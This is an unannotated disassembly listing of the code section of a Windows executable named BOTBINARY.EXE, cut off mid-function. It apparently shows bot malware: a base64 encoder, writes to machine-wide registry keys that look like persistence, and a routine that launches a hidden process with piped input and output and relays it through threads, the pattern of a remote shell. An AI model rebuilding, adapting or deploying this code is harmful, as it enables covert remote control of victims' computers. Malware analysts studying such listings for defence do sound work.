
BOTBINARY.EXE:     file format pei-i386


Disassembly of section .text:

13141000 <.text>:
13141000:	10 cd                	adc    %cl,%ch
13141002:	00 00                	add    %al,(%eax)
13141004:	22 cd                	and    %ch,%cl
13141006:	00 00                	add    %al,(%eax)
13141008:	32 cd                	xor    %ch,%cl
1314100a:	00 00                	add    %al,(%eax)
1314100c:	04 cd                	add    $0xcd,%al
1314100e:	00 00                	add    %al,(%eax)
13141010:	00 00                	add    %al,(%eax)
13141012:	00 00                	add    %al,(%eax)
13141014:	41                   	inc    %ecx
13141015:	42                   	inc    %edx
13141016:	43                   	inc    %ebx
13141017:	44                   	inc    %esp
13141018:	45                   	inc    %ebp
13141019:	46                   	inc    %esi
1314101a:	47                   	inc    %edi
1314101b:	48                   	dec    %eax
1314101c:	49                   	dec    %ecx
1314101d:	4a                   	dec    %edx
1314101e:	4b                   	dec    %ebx
1314101f:	4c                   	dec    %esp
13141020:	4d                   	dec    %ebp
13141021:	4e                   	dec    %esi
13141022:	4f                   	dec    %edi
13141023:	50                   	push   %eax
13141024:	51                   	push   %ecx
13141025:	52                   	push   %edx
13141026:	53                   	push   %ebx
13141027:	54                   	push   %esp
13141028:	55                   	push   %ebp
13141029:	56                   	push   %esi
1314102a:	57                   	push   %edi
1314102b:	58                   	pop    %eax
1314102c:	59                   	pop    %ecx
1314102d:	5a                   	pop    %edx
1314102e:	61                   	popa   
1314102f:	62 63 64             	bound  %esp,0x64(%ebx)
13141032:	65 66 67 68 69 6a    	gs addr16 pushw $0x6a69
13141038:	6b 6c 6d 6e 6f       	imul   $0x6f,0x6e(%ebp,%ebp,2),%ebp
1314103d:	70 71                	jo     0x131410b0
1314103f:	72 73                	jb     0x131410b4
13141041:	74 75                	je     0x131410b8
13141043:	76 77                	jbe    0x131410bc
13141045:	78 79                	js     0x131410c0
13141047:	7a 30                	jp     0x13141079
13141049:	31 32                	xor    %esi,(%edx)
1314104b:	33 34 35 36 37 38 39 	xor    0x39383736(,%esi,1),%esi
13141052:	2b 2f                	sub    (%edi),%ebp
13141054:	00 00                	add    %al,(%eax)
13141056:	00 00                	add    %al,(%eax)
13141058:	4f                   	dec    %edi
13141059:	46                   	inc    %esi
1314105a:	46                   	inc    %esi
1314105b:	00 4f 4e             	add    %cl,0x4e(%edi)
1314105e:	00 00                	add    %al,(%eax)
13141060:	55                   	push   %ebp
13141061:	8b ec                	mov    %esp,%ebp
13141063:	81 ec 00 02 00 00    	sub    $0x200,%esp
13141069:	56                   	push   %esi
1314106a:	be 00 01 00 00       	mov    $0x100,%esi
1314106f:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13141075:	56                   	push   %esi
13141076:	50                   	push   %eax
13141077:	6a 00                	push   $0x0
13141079:	ff 15 58 35 15 13    	call   *0x13153558
1314107f:	50                   	push   %eax
13141080:	ff 15 40 35 15 13    	call   *0x13153540
13141086:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
1314108c:	85 c0                	test   %eax,%eax
1314108e:	74 52                	je     0x131410e2
13141090:	56                   	push   %esi
13141091:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13141097:	6a 00                	push   $0x0
13141099:	50                   	push   %eax
1314109a:	e8 83 15 00 00       	call   0x13142622
1314109f:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
131410a5:	6a 2b                	push   $0x2b
131410a7:	50                   	push   %eax
131410a8:	68 c0 d1 14 13       	push   $0x1314d1c0
131410ad:	e8 cb 4b 00 00       	call   0x13145c7d
131410b2:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
131410b8:	50                   	push   %eax
131410b9:	ff 75 08             	pushl  0x8(%ebp)
131410bc:	68 00 d0 14 13       	push   $0x1314d000
131410c1:	ff 75 0c             	pushl  0xc(%ebp)
131410c4:	ff 15 98 39 15 13    	call   *0x13153998
131410ca:	83 c4 28             	add    $0x28,%esp
131410cd:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
131410d3:	6a 00                	push   $0x0
131410d5:	ff 75 0c             	pushl  0xc(%ebp)
131410d8:	50                   	push   %eax
131410d9:	ff 15 f4 33 15 13    	call   *0x131533f4
131410df:	6a 01                	push   $0x1
131410e1:	58                   	pop    %eax
131410e2:	5e                   	pop    %esi
131410e3:	c9                   	leave  
131410e4:	c3                   	ret    
131410e5:	55                   	push   %ebp
131410e6:	8b ec                	mov    %esp,%ebp
131410e8:	81 ec 54 02 00 00    	sub    $0x254,%esp
131410ee:	56                   	push   %esi
131410ef:	57                   	push   %edi
131410f0:	68 00 01 00 00       	push   $0x100
131410f5:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
131410fb:	be 80 00 00 00       	mov    $0x80,%esi
13141100:	6a 00                	push   $0x0
13141102:	50                   	push   %eax
13141103:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
1314110a:	89 75 f8             	mov    %esi,-0x8(%ebp)
1314110d:	e8 10 15 00 00       	call   0x13142622
13141112:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
13141118:	6a 2b                	push   $0x2b
1314111a:	50                   	push   %eax
1314111b:	68 00 d2 14 13       	push   $0x1314d200
13141120:	e8 58 4b 00 00       	call   0x13145c7d
13141125:	8d 85 ac fe ff ff    	lea    -0x154(%ebp),%eax
1314112b:	50                   	push   %eax
1314112c:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
13141132:	50                   	push   %eax
13141133:	e8 28 ff ff ff       	call   0x13141060
13141138:	83 c4 20             	add    $0x20,%esp
1314113b:	85 c0                	test   %eax,%eax
1314113d:	0f 84 bb 00 00 00    	je     0x131411fe
13141143:	8d 45 ac             	lea    -0x54(%ebp),%eax
13141146:	68 20 d0 14 13       	push   $0x1314d020
1314114b:	50                   	push   %eax
1314114c:	e8 88 4c 00 00       	call   0x13145dd9
13141151:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13141154:	68 10 d0 14 13       	push   $0x1314d010
13141159:	50                   	push   %eax
1314115a:	e8 7a 4c 00 00       	call   0x13145dd9
1314115f:	83 c4 10             	add    $0x10,%esp
13141162:	8d 45 fc             	lea    -0x4(%ebp),%eax
13141165:	50                   	push   %eax
13141166:	68 3f 00 0f 00       	push   $0xf003f
1314116b:	8d 45 ac             	lea    -0x54(%ebp),%eax
1314116e:	6a 00                	push   $0x0
13141170:	50                   	push   %eax
13141171:	68 02 00 00 80       	push   $0x80000002
13141176:	ff 15 ac 33 15 13    	call   *0x131533ac
1314117c:	85 c0                	test   %eax,%eax
1314117e:	75 7e                	jne    0x131411fe
13141180:	56                   	push   %esi
13141181:	89 75 f8             	mov    %esi,-0x8(%ebp)
13141184:	e8 75 42 00 00       	call   0x131453fe
13141189:	8b f8                	mov    %eax,%edi
1314118b:	59                   	pop    %ecx
1314118c:	8d 45 f8             	lea    -0x8(%ebp),%eax
1314118f:	be 08 d0 14 13       	mov    $0x1314d008,%esi
13141194:	50                   	push   %eax
13141195:	8d 45 f4             	lea    -0xc(%ebp),%eax
13141198:	57                   	push   %edi
13141199:	50                   	push   %eax
1314119a:	6a 00                	push   $0x0
1314119c:	56                   	push   %esi
1314119d:	ff 75 fc             	pushl  -0x4(%ebp)
131411a0:	ff 15 b0 33 15 13    	call   *0x131533b0
131411a6:	85 c0                	test   %eax,%eax
131411a8:	75 54                	jne    0x131411fe
131411aa:	8d 85 ac fe ff ff    	lea    -0x154(%ebp),%eax
131411b0:	50                   	push   %eax
131411b1:	57                   	push   %edi
131411b2:	e8 86 14 00 00       	call   0x1314263d
131411b7:	59                   	pop    %ecx
131411b8:	85 c0                	test   %eax,%eax
131411ba:	59                   	pop    %ecx
131411bb:	74 04                	je     0x131411c1
131411bd:	6a 02                	push   $0x2
131411bf:	eb 53                	jmp    0x13141214
131411c1:	8d 85 ac fe ff ff    	lea    -0x154(%ebp),%eax
131411c7:	50                   	push   %eax
131411c8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
131411cb:	50                   	push   %eax
131411cc:	57                   	push   %edi
131411cd:	ff 15 98 39 15 13    	call   *0x13153998
131411d3:	8d 85 ac fe ff ff    	lea    -0x154(%ebp),%eax
131411d9:	50                   	push   %eax
131411da:	e8 1e 15 00 00       	call   0x131426fd
131411df:	8b 4d f8             	mov    -0x8(%ebp),%ecx
131411e2:	83 c4 10             	add    $0x10,%esp
131411e5:	8d 44 08 01          	lea    0x1(%eax,%ecx,1),%eax
131411e9:	50                   	push   %eax
131411ea:	57                   	push   %edi
131411eb:	ff 75 f4             	pushl  -0xc(%ebp)
131411ee:	6a 00                	push   $0x0
131411f0:	56                   	push   %esi
131411f1:	ff 75 fc             	pushl  -0x4(%ebp)
131411f4:	ff 15 44 35 15 13    	call   *0x13153544
131411fa:	85 c0                	test   %eax,%eax
131411fc:	74 04                	je     0x13141202
131411fe:	33 c0                	xor    %eax,%eax
13141200:	eb 13                	jmp    0x13141215
13141202:	ff 75 fc             	pushl  -0x4(%ebp)
13141205:	ff 15 cc 36 15 13    	call   *0x131536cc
1314120b:	57                   	push   %edi
1314120c:	e8 01 42 00 00       	call   0x13145412
13141211:	59                   	pop    %ecx
13141212:	6a 01                	push   $0x1
13141214:	58                   	pop    %eax
13141215:	5f                   	pop    %edi
13141216:	5e                   	pop    %esi
13141217:	c9                   	leave  
13141218:	c3                   	ret    
13141219:	55                   	push   %ebp
1314121a:	8b ec                	mov    %esp,%ebp
1314121c:	81 ec 4c 03 00 00    	sub    $0x34c,%esp
13141222:	8d 45 ec             	lea    -0x14(%ebp),%eax
13141225:	68 58 d0 14 13       	push   $0x1314d058
1314122a:	50                   	push   %eax
1314122b:	e8 a9 4b 00 00       	call   0x13145dd9
13141230:	8d 45 b4             	lea    -0x4c(%ebp),%eax
13141233:	68 20 d0 14 13       	push   $0x1314d020
13141238:	50                   	push   %eax
13141239:	e8 9b 4b 00 00       	call   0x13145dd9
1314123e:	83 c4 10             	add    $0x10,%esp
13141241:	8d 45 fc             	lea    -0x4(%ebp),%eax
13141244:	50                   	push   %eax
13141245:	68 3f 00 0f 00       	push   $0xf003f
1314124a:	8d 45 b4             	lea    -0x4c(%ebp),%eax
1314124d:	6a 00                	push   $0x0
1314124f:	50                   	push   %eax
13141250:	68 02 00 00 80       	push   $0x80000002
13141255:	ff 15 ac 33 15 13    	call   *0x131533ac
1314125b:	85 c0                	test   %eax,%eax
1314125d:	74 04                	je     0x13141263
1314125f:	33 c0                	xor    %eax,%eax
13141261:	c9                   	leave  
13141262:	c3                   	ret    
13141263:	8d 45 ec             	lea    -0x14(%ebp),%eax
13141266:	6a 0c                	push   $0xc
13141268:	50                   	push   %eax
13141269:	6a 01                	push   $0x1
1314126b:	6a 00                	push   $0x0
1314126d:	68 08 d0 14 13       	push   $0x1314d008
13141272:	ff 75 fc             	pushl  -0x4(%ebp)
13141275:	ff 15 44 35 15 13    	call   *0x13153544
1314127b:	85 c0                	test   %eax,%eax
1314127d:	75 e0                	jne    0x1314125f
1314127f:	56                   	push   %esi
13141280:	be 00 01 00 00       	mov    $0x100,%esi
13141285:	56                   	push   %esi
13141286:	50                   	push   %eax
13141287:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
1314128d:	50                   	push   %eax
1314128e:	e8 8f 13 00 00       	call   0x13142622
13141293:	56                   	push   %esi
13141294:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
1314129a:	6a 00                	push   $0x0
1314129c:	50                   	push   %eax
1314129d:	e8 80 13 00 00       	call   0x13142622
131412a2:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
131412a8:	6a 2b                	push   $0x2b
131412aa:	50                   	push   %eax
131412ab:	68 00 d2 14 13       	push   $0x1314d200
131412b0:	e8 c8 49 00 00       	call   0x13145c7d
131412b5:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
131412bb:	6a 2b                	push   $0x2b
131412bd:	50                   	push   %eax
131412be:	68 c0 d1 14 13       	push   $0x1314d1c0
131412c3:	e8 b5 49 00 00       	call   0x13145c7d
131412c8:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
131412ce:	50                   	push   %eax
131412cf:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
131412d5:	50                   	push   %eax
131412d6:	8d 85 b4 fc ff ff    	lea    -0x34c(%ebp),%eax
131412dc:	68 00 d0 14 13       	push   $0x1314d000
131412e1:	50                   	push   %eax
131412e2:	ff 15 98 39 15 13    	call   *0x13153998
131412e8:	83 c4 40             	add    $0x40,%esp
131412eb:	8d 85 b4 fc ff ff    	lea    -0x34c(%ebp),%eax
131412f1:	50                   	push   %eax
131412f2:	ff 15 c8 36 15 13    	call   *0x131536c8
131412f8:	f7 d8                	neg    %eax
131412fa:	1b c0                	sbb    %eax,%eax
131412fc:	5e                   	pop    %esi
131412fd:	f7 d8                	neg    %eax
131412ff:	c9                   	leave  
13141300:	c3                   	ret    
13141301:	55                   	push   %ebp
13141302:	8b ec                	mov    %esp,%ebp
13141304:	81 ec 48 02 00 00    	sub    $0x248,%esp
1314130a:	68 00 01 00 00       	push   $0x100
1314130f:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
13141315:	6a 00                	push   $0x0
13141317:	50                   	push   %eax
13141318:	e8 05 13 00 00       	call   0x13142622
1314131d:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
13141323:	6a 2b                	push   $0x2b
13141325:	50                   	push   %eax
13141326:	68 00 d2 14 13       	push   $0x1314d200
1314132b:	e8 4d 49 00 00       	call   0x13145c7d
13141330:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
13141336:	50                   	push   %eax
13141337:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
1314133d:	50                   	push   %eax
1314133e:	e8 1d fd ff ff       	call   0x13141060
13141343:	8d 45 b8             	lea    -0x48(%ebp),%eax
13141346:	68 7c d0 14 13       	push   $0x1314d07c
1314134b:	50                   	push   %eax
1314134c:	e8 88 4a 00 00       	call   0x13145dd9
13141351:	8d 45 e8             	lea    -0x18(%ebp),%eax
13141354:	68 68 d0 14 13       	push   $0x1314d068
13141359:	50                   	push   %eax
1314135a:	e8 7a 4a 00 00       	call   0x13145dd9
1314135f:	83 c4 30             	add    $0x30,%esp
13141362:	8d 45 fc             	lea    -0x4(%ebp),%eax
13141365:	50                   	push   %eax
13141366:	68 3f 00 0f 00       	push   $0xf003f
1314136b:	8d 45 b8             	lea    -0x48(%ebp),%eax
1314136e:	6a 00                	push   $0x0
13141370:	50                   	push   %eax
13141371:	68 02 00 00 80       	push   $0x80000002
13141376:	ff 15 ac 33 15 13    	call   *0x131533ac
1314137c:	85 c0                	test   %eax,%eax
1314137e:	75 2a                	jne    0x131413aa
13141380:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
13141386:	50                   	push   %eax
13141387:	e8 71 13 00 00       	call   0x131426fd
1314138c:	59                   	pop    %ecx
1314138d:	50                   	push   %eax
1314138e:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
13141394:	50                   	push   %eax
13141395:	6a 01                	push   $0x1
13141397:	8d 45 e8             	lea    -0x18(%ebp),%eax
1314139a:	6a 00                	push   $0x0
1314139c:	50                   	push   %eax
1314139d:	ff 75 fc             	pushl  -0x4(%ebp)
131413a0:	ff 15 44 35 15 13    	call   *0x13153544
131413a6:	85 c0                	test   %eax,%eax
131413a8:	74 04                	je     0x131413ae
131413aa:	33 c0                	xor    %eax,%eax
131413ac:	c9                   	leave  
131413ad:	c3                   	ret    
131413ae:	ff 75 fc             	pushl  -0x4(%ebp)
131413b1:	ff 15 cc 36 15 13    	call   *0x131536cc
131413b7:	6a 01                	push   $0x1
131413b9:	58                   	pop    %eax
131413ba:	c9                   	leave  
131413bb:	c3                   	ret    
131413bc:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
131413c3:	74 05                	je     0x131413ca
131413c5:	e9 37 ff ff ff       	jmp    0x13141301
131413ca:	e9 16 fd ff ff       	jmp    0x131410e5
131413cf:	55                   	push   %ebp
131413d0:	8b ec                	mov    %esp,%ebp
131413d2:	51                   	push   %ecx
131413d3:	53                   	push   %ebx
131413d4:	8b 5d 10             	mov    0x10(%ebp),%ebx
131413d7:	33 c0                	xor    %eax,%eax
131413d9:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
131413dd:	56                   	push   %esi
131413de:	57                   	push   %edi
131413df:	0f 86 98 00 00 00    	jbe    0x1314147d
131413e5:	8b 75 08             	mov    0x8(%ebp),%esi
131413e8:	6a 04                	push   $0x4
131413ea:	5f                   	pop    %edi
131413eb:	8a 0e                	mov    (%esi),%cl
131413ed:	8a 56 01             	mov    0x1(%esi),%dl
131413f0:	46                   	inc    %esi
131413f1:	83 6d 0c 03          	subl   $0x3,0xc(%ebp)
131413f5:	46                   	inc    %esi
131413f6:	8a 1e                	mov    (%esi),%bl
131413f8:	46                   	inc    %esi
131413f9:	88 5d 0a             	mov    %bl,0xa(%ebp)
131413fc:	8a d9                	mov    %cl,%bl
131413fe:	c0 eb 02             	shr    $0x2,%bl
13141401:	88 5d fc             	mov    %bl,-0x4(%ebp)
13141404:	80 e1 03             	and    $0x3,%cl
13141407:	8a da                	mov    %dl,%bl
13141409:	80 e2 0f             	and    $0xf,%dl
1314140c:	c0 e1 04             	shl    $0x4,%cl
1314140f:	c0 eb 04             	shr    $0x4,%bl
13141412:	02 cb                	add    %bl,%cl
13141414:	8a 5d 0a             	mov    0xa(%ebp),%bl
13141417:	88 4d fd             	mov    %cl,-0x3(%ebp)
1314141a:	8a cb                	mov    %bl,%cl
1314141c:	c0 e2 02             	shl    $0x2,%dl
1314141f:	c0 e9 06             	shr    $0x6,%cl
13141422:	02 d1                	add    %cl,%dl
13141424:	80 e3 3f             	and    $0x3f,%bl
13141427:	3b 7d 14             	cmp    0x14(%ebp),%edi
1314142a:	88 5d ff             	mov    %bl,-0x1(%ebp)
1314142d:	0f 87 eb 00 00 00    	ja     0x1314151e
13141433:	0f b6 4d fc          	movzbl -0x4(%ebp),%ecx
13141437:	8b 5d 10             	mov    0x10(%ebp),%ebx
1314143a:	8a 89 14 10 14 13    	mov    0x13141014(%ecx),%cl
13141440:	88 0c 18             	mov    %cl,(%eax,%ebx,1)
13141443:	40                   	inc    %eax
13141444:	0f b6 4d fd          	movzbl -0x3(%ebp),%ecx
13141448:	47                   	inc    %edi
13141449:	8a 89 14 10 14 13    	mov    0x13141014(%ecx),%cl
1314144f:	88 0c 18             	mov    %cl,(%eax,%ebx,1)
13141452:	40                   	inc    %eax
13141453:	0f b6 ca             	movzbl %dl,%ecx
13141456:	47                   	inc    %edi
13141457:	8a 89 14 10 14 13    	mov    0x13141014(%ecx),%cl
1314145d:	88 0c 18             	mov    %cl,(%eax,%ebx,1)
13141460:	40                   	inc    %eax
13141461:	0f b6 4d ff          	movzbl -0x1(%ebp),%ecx
13141465:	47                   	inc    %edi
13141466:	8a 89 14 10 14 13    	mov    0x13141014(%ecx),%cl
1314146c:	88 0c 18             	mov    %cl,(%eax,%ebx,1)
1314146f:	40                   	inc    %eax
13141470:	47                   	inc    %edi
13141471:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
13141475:	0f 87 70 ff ff ff    	ja     0x131413eb
1314147b:	eb 03                	jmp    0x13141480
1314147d:	8b 75 08             	mov    0x8(%ebp),%esi
13141480:	33 c9                	xor    %ecx,%ecx
13141482:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
13141485:	0f 84 8e 00 00 00    	je     0x13141519
1314148b:	88 4d 0a             	mov    %cl,0xa(%ebp)
1314148e:	88 4d 09             	mov    %cl,0x9(%ebp)
13141491:	88 4d 08             	mov    %cl,0x8(%ebp)
13141494:	76 17                	jbe    0x131414ad
13141496:	8b 4d 0c             	mov    0xc(%ebp),%ecx
13141499:	8d 7d 08             	lea    0x8(%ebp),%edi
1314149c:	8b d1                	mov    %ecx,%edx
1314149e:	c1 e9 02             	shr    $0x2,%ecx
131414a1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131414a3:	8b ca                	mov    %edx,%ecx
131414a5:	83 e1 03             	and    $0x3,%ecx
131414a8:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
131414aa:	8a 4d 08             	mov    0x8(%ebp),%cl
131414ad:	8a d1                	mov    %cl,%dl
131414af:	80 e1 03             	and    $0x3,%cl
131414b2:	c0 ea 02             	shr    $0x2,%dl
131414b5:	88 55 fc             	mov    %dl,-0x4(%ebp)
131414b8:	8a 55 09             	mov    0x9(%ebp),%dl
131414bb:	c0 e1 04             	shl    $0x4,%cl
131414be:	c0 ea 04             	shr    $0x4,%dl
131414c1:	02 ca                	add    %dl,%cl
131414c3:	8a 55 0a             	mov    0xa(%ebp),%dl
131414c6:	88 4d fd             	mov    %cl,-0x3(%ebp)
131414c9:	8a 4d 09             	mov    0x9(%ebp),%cl
131414cc:	80 e1 0f             	and    $0xf,%cl
131414cf:	c0 e1 02             	shl    $0x2,%cl
131414d2:	c0 ea 06             	shr    $0x6,%dl
131414d5:	02 ca                	add    %dl,%cl
131414d7:	8d 50 04             	lea    0x4(%eax),%edx
131414da:	3b 55 14             	cmp    0x14(%ebp),%edx
131414dd:	77 3f                	ja     0x1314151e
131414df:	0f b6 55 fc          	movzbl -0x4(%ebp),%edx
131414e3:	8a 92 14 10 14 13    	mov    0x13141014(%edx),%dl
131414e9:	88 14 18             	mov    %dl,(%eax,%ebx,1)
131414ec:	40                   	inc    %eax
131414ed:	0f b6 55 fd          	movzbl -0x3(%ebp),%edx
131414f1:	8a 92 14 10 14 13    	mov    0x13141014(%edx),%dl
131414f7:	88 14 18             	mov    %dl,(%eax,%ebx,1)
131414fa:	40                   	inc    %eax
131414fb:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
131414ff:	75 06                	jne    0x13141507
13141501:	c6 04 18 3d          	movb   $0x3d,(%eax,%ebx,1)
13141505:	eb 0c                	jmp    0x13141513
13141507:	0f b6 c9             	movzbl %cl,%ecx
1314150a:	8a 89 14 10 14 13    	mov    0x13141014(%ecx),%cl
13141510:	88 0c 18             	mov    %cl,(%eax,%ebx,1)
13141513:	40                   	inc    %eax
13141514:	c6 04 18 3d          	movb   $0x3d,(%eax,%ebx,1)
13141518:	40                   	inc    %eax
13141519:	3b 45 14             	cmp    0x14(%ebp),%eax
1314151c:	72 05                	jb     0x13141523
1314151e:	83 c8 ff             	or     $0xffffffff,%eax
13141521:	eb 04                	jmp    0x13141527
13141523:	80 24 18 00          	andb   $0x0,(%eax,%ebx,1)
13141527:	5f                   	pop    %edi
13141528:	5e                   	pop    %esi
13141529:	5b                   	pop    %ebx
1314152a:	c9                   	leave  
1314152b:	c3                   	ret    
1314152c:	56                   	push   %esi
1314152d:	8b 74 24 08          	mov    0x8(%esp),%esi
13141531:	83 7e 18 00          	cmpl   $0x0,0x18(%esi)
13141535:	75 33                	jne    0x1314156a
13141537:	ff 36                	pushl  (%esi)
13141539:	ff 15 e4 36 15 13    	call   *0x131536e4
1314153f:	ff 76 04             	pushl  0x4(%esi)
13141542:	ff 15 80 33 15 13    	call   *0x13153380
13141548:	ff 76 10             	pushl  0x10(%esi)
1314154b:	ff 15 80 33 15 13    	call   *0x13153380
13141551:	ff 76 08             	pushl  0x8(%esi)
13141554:	ff 15 80 33 15 13    	call   *0x13153380
1314155a:	ff 76 0c             	pushl  0xc(%esi)
1314155d:	ff 15 80 33 15 13    	call   *0x13153380
13141563:	c7 46 18 01 00 00 00 	movl   $0x1,0x18(%esi)
1314156a:	5e                   	pop    %esi
1314156b:	c3                   	ret    
1314156c:	56                   	push   %esi
1314156d:	8b 74 24 08          	mov    0x8(%esp),%esi
13141571:	6a ff                	push   $0xffffffff
13141573:	ff 76 14             	pushl  0x14(%esi)
13141576:	ff 15 78 33 15 13    	call   *0x13153378
1314157c:	56                   	push   %esi
1314157d:	e8 aa ff ff ff       	call   0x1314152c
13141582:	59                   	pop    %ecx
13141583:	6a 00                	push   $0x0
13141585:	ff 15 ec 36 15 13    	call   *0x131536ec
1314158b:	33 c0                	xor    %eax,%eax
1314158d:	5e                   	pop    %esi
1314158e:	c2 04 00             	ret    $0x4
13141591:	55                   	push   %ebp
13141592:	8b ec                	mov    %esp,%ebp
13141594:	81 ec 00 01 00 00    	sub    $0x100,%esp
1314159a:	56                   	push   %esi
1314159b:	8b 75 08             	mov    0x8(%ebp),%esi
1314159e:	8d 45 08             	lea    0x8(%ebp),%eax
131415a1:	6a 00                	push   $0x0
131415a3:	50                   	push   %eax
131415a4:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
131415aa:	68 00 01 00 00       	push   $0x100
131415af:	50                   	push   %eax
131415b0:	ff 76 0c             	pushl  0xc(%esi)
131415b3:	ff 15 54 35 15 13    	call   *0x13153554
131415b9:	85 c0                	test   %eax,%eax
131415bb:	74 18                	je     0x131415d5
131415bd:	6a 00                	push   $0x0
131415bf:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
131415c5:	ff 75 08             	pushl  0x8(%ebp)
131415c8:	50                   	push   %eax
131415c9:	ff 36                	pushl  (%esi)
131415cb:	ff 15 68 37 15 13    	call   *0x13153768
131415d1:	85 c0                	test   %eax,%eax
131415d3:	75 c9                	jne    0x1314159e
131415d5:	33 c0                	xor    %eax,%eax
131415d7:	5e                   	pop    %esi
131415d8:	c9                   	leave  
131415d9:	c2 04 00             	ret    $0x4
131415dc:	55                   	push   %ebp
131415dd:	8b ec                	mov    %esp,%ebp
131415df:	81 ec 6c 01 00 00    	sub    $0x16c,%esp
131415e5:	8b 45 08             	mov    0x8(%ebp),%eax
131415e8:	56                   	push   %esi
131415e9:	33 f6                	xor    %esi,%esi
131415eb:	a3 30 22 15 13       	mov    %eax,0x13152230
131415f0:	57                   	push   %edi
131415f1:	8d 45 dc             	lea    -0x24(%ebp),%eax
131415f4:	56                   	push   %esi
131415f5:	50                   	push   %eax
131415f6:	68 38 22 15 13       	push   $0x13152238
131415fb:	68 34 22 15 13       	push   $0x13152234
13141600:	c7 45 dc 0c 00 00 00 	movl   $0xc,-0x24(%ebp)
13141607:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
1314160e:	89 75 e0             	mov    %esi,-0x20(%ebp)
13141611:	89 35 48 22 15 13    	mov    %esi,0x13152248
13141617:	ff 15 a8 36 15 13    	call   *0x131536a8
1314161d:	8d 45 dc             	lea    -0x24(%ebp),%eax
13141620:	56                   	push   %esi
13141621:	50                   	push   %eax
13141622:	68 40 22 15 13       	push   $0x13152240
13141627:	68 3c 22 15 13       	push   $0x1315223c
1314162c:	ff 15 a8 36 15 13    	call   *0x131536a8
13141632:	6a 44                	push   $0x44
13141634:	8d 45 94             	lea    -0x6c(%ebp),%eax
13141637:	5f                   	pop    %edi
13141638:	57                   	push   %edi
13141639:	56                   	push   %esi
1314163a:	50                   	push   %eax
1314163b:	e8 e2 0f 00 00       	call   0x13142622
13141640:	a1 34 22 15 13       	mov    0x13152234,%eax
13141645:	83 c4 0c             	add    $0xc,%esp
13141648:	89 45 cc             	mov    %eax,-0x34(%ebp)
1314164b:	a1 40 22 15 13       	mov    0x13152240,%eax
13141650:	89 45 d0             	mov    %eax,-0x30(%ebp)
13141653:	89 45 d4             	mov    %eax,-0x2c(%ebp)
13141656:	8d 45 e8             	lea    -0x18(%ebp),%eax
13141659:	89 7d 94             	mov    %edi,-0x6c(%ebp)
1314165c:	50                   	push   %eax
1314165d:	8d 45 94             	lea    -0x6c(%ebp),%eax
13141660:	50                   	push   %eax
13141661:	56                   	push   %esi
13141662:	56                   	push   %esi
13141663:	56                   	push   %esi
13141664:	6a 01                	push   $0x1
13141666:	56                   	push   %esi
13141667:	56                   	push   %esi
13141668:	68 ac d0 14 13       	push   $0x1314d0ac
1314166d:	56                   	push   %esi
1314166e:	c7 45 c0 01 01 00 00 	movl   $0x101,-0x40(%ebp)
13141675:	66 89 75 c4          	mov    %si,-0x3c(%ebp)
13141679:	ff 15 2c 37 15 13    	call   *0x1315372c
1314167f:	85 c0                	test   %eax,%eax
13141681:	75 08                	jne    0x1314168b
13141683:	6a 02                	push   $0x2
13141685:	58                   	pop    %eax
13141686:	e9 f1 00 00 00       	jmp    0x1314177c
1314168b:	6a ff                	push   $0xffffffff
1314168d:	ff 75 e8             	pushl  -0x18(%ebp)
13141690:	ff 15 a8 33 15 13    	call   *0x131533a8
13141696:	8b 45 e8             	mov    -0x18(%ebp),%eax
13141699:	bf 30 22 15 13       	mov    $0x13152230,%edi
1314169e:	a3 44 22 15 13       	mov    %eax,0x13152244
131416a3:	8d 45 f8             	lea    -0x8(%ebp),%eax
131416a6:	50                   	push   %eax
131416a7:	56                   	push   %esi
131416a8:	57                   	push   %edi
131416a9:	68 6c 15 14 13       	push   $0x1314156c
131416ae:	56                   	push   %esi
131416af:	56                   	push   %esi
131416b0:	ff 15 30 37 15 13    	call   *0x13153730
131416b6:	89 45 f8             	mov    %eax,-0x8(%ebp)
131416b9:	8d 45 fc             	lea    -0x4(%ebp),%eax
131416bc:	50                   	push   %eax
131416bd:	56                   	push   %esi
131416be:	57                   	push   %edi
131416bf:	68 91 15 14 13       	push   $0x13141591
131416c4:	56                   	push   %esi
131416c5:	56                   	push   %esi
131416c6:	ff 15 30 37 15 13    	call   *0x13153730
131416cc:	89 45 fc             	mov    %eax,-0x4(%ebp)
131416cf:	39 35 4c 22 15 13    	cmp    %esi,0x1315224c
131416d5:	74 3c                	je     0x13141713
131416d7:	56                   	push   %esi
131416d8:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
131416de:	68 00 01 00 00       	push   $0x100
